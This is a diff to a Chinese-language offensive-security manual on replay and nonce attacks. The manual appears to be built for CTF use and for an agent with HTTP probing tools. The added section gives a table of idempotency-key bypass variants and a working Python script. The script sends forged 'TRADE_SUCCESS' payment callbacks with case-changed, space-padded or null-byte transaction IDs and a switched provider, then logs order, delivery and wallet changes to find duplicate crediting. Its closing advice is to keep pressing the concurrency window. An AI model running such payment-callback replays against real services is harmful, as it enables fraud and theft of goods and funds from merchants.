@@ -15,10 +15,10 @@ signals: ["replay attack", "重放攻击", "nonce绕过", "nonce预测", "timest
 mcp_tools: ["http_probe", "kb_router"]
 keywords: ["重放攻击", "replay attack", "nonce绕过", "timestamp绕过", "nonce预测", "并发重放", "窗口攻击", "支付回调重放", "幂等绕过"]
 difficulty: "advanced"
-tags: ["signature", "replay", "nonce", "race-condition", "time-based", "web-security", "ctf"]
+tags: ["signature", "replay", "nonce", "race-condition", "time-based", "payment", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm", "ctf-website/12-payment/payment-callback-async"]
+related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm", "ctf-website/13-signature/04-canonicalization", "ctf-website/12-payment/payment-callback-async", "ctf-website/12-payment/payment-race-lost-update", "ctf-website/24-database/02-sqli-advanced"]
 ---
 # Replay / Nonce / Timestamp — 重放攻击深度技术手册
 
@@ -107,6 +107,80 @@ def concurrent_replay(order_id, n=20):
         "after": after,
     }, ensure_ascii=False, indent=2))
 ```
+
+### 0.2 幂等账本时间线
+
+支付重放的真正目标是 idempotency key 选错、消费时机错、唯一约束没覆盖业务字段。每轮重放都要同时记录 `notify_id`、`transaction_id`、订单状态、流水数、权益数和钱包差分。
+
+| 幂等字段 | 常见错误 | 变体 | 命中标志 |
+|---|---|---|---|
+| `notify_id` | 只按通知 ID 去重 | same tx / new notify | 同交易多次发货 |
+| `transaction_id` | 未规范化 | `TX1`, `tx1`, `TX1 `, `TX1%00` | 多条 payment log |
+| `order_id` | 只按订单去重但发货不幂等 | same order / new delivery | 多个 license/download |
+| `provider` | 唯一键缺 provider 或 provider 可控 | `wechat` → `mock` | 跨通道重复入账 |
+| `timestamp` | 签名窗口大但 nonce 未消费 | 旧 ts / 未来 ts | 过期请求仍有副作用 |
+
+```python
+# replay_idempotency_timeline.py
+import csv
+import time
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def read_state(order_id):
+    probes = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "wallet": "/api/wallet",
+        "me": "/api/me",
+    }
+    out = {}
+    for name, path in probes.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = f"{r.status_code}:{len(r.text)}:{r.text[:160].replace(chr(10), ' ')}"
+    return out
+
+def send_notify(order_id, tx, notify, provider="mock"):
+    body = {
+        "out_trade_no": order_id,
+        "transaction_id": tx,
+        "notify_id": notify,
+        "provider": provider,
+        "trade_status": "TRADE_SUCCESS",
+        "total_amount": "0.01",
+    }
+    return S.post(BASE + "/notify", json=body, timeout=10, allow_redirects=False)
+
+def replay_timeline(order_id, variants, out_csv="exports/replay_idempotency_timeline.csv"):
+    rows = []
+    rows.append({"phase": "before", "variant": "", "response": "", **read_state(order_id)})
+    for i, v in enumerate(variants):
+        r = send_notify(order_id, **v)
+        rows.append({
+            "phase": "after_replay",
+            "variant": repr(v),
+            "response": f"{r.status_code}:{len(r.text)}:{r.text[:160]}",
+            **read_state(order_id),
+        })
+        time.sleep(0.2)
+    rows.append({"phase": "after_settle", "variant": "", "response": "", **read_state(order_id)})
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=list(rows[0]))
+        w.writeheader()
+        w.writerows(rows)
+
+replay_timeline("ORD1", [
+    {"tx": "TX1", "notify": "N1"},
+    {"tx": "TX1", "notify": "N2"},
+    {"tx": "tx1", "notify": "N3"},
+    {"tx": "TX1 ", "notify": "N4"},
+])
+```
+
+判定顺序：先看 `payment/delivery/wallet/me` 是否随每个变体继续变化，再看最终 `after_settle` 是否回滚。只有响应 200、账本不变，说明幂等层生效；响应失败但权益增加，说明副作用发生在返回错误之前，继续压并发窗口。
 
 ## 1. 纯重放攻击
 
